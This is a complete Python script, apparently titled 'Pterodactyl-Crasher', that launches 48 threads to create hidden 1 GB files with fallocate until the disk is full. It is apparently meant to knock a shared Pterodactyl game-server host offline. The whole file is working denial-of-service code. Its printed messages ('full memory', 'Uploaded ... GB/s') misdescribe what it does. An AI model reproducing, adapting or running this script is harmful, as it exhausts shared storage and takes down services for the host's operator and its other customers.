import concurrent.futures
import subprocess
import threading
import uuid
from time import sleep
import os

megabytes = 0
curr = 0


def allocate_space():
    global megabytes, curr
    while True:
        try:
            target = f".___tmp_{uuid.uuid4()}"
            subprocess.run(["fallocate", "-l", "1G", target], check=True)
            curr += 1
            megabytes += 1
        except subprocess.CalledProcessError as e:
            print("There is no room for a host!, ")
            break
        except Exception as e:
            pass


def display_status():
    global megabytes, curr
    displays = 0
    try:
        while True:
            sleep(0.1)
            displays += 1
            print(f"Uploaded a total of [ {megabytes} GB ] at a speed of [ {curr} GB/s ]")
            if displays % 10 == 0:
                curr = 0
    except Exception as e:
        print(e)


def main():
    print("github.com/ManucrackYT/Pterodactyl-Crasher \n\nPterodactyl-Crasher")
    print("Mode: full memory")
    print("Getting ready..")

    with concurrent.futures.ThreadPoolExecutor(max_workers=48) as executor:
        for _ in range(48):
            executor.submit(allocate_space)

    print("Let's go!")
    status_thread = threading.Thread(target=display_status)
    status_thread.start()


if __name__ == "__main__":
    main()
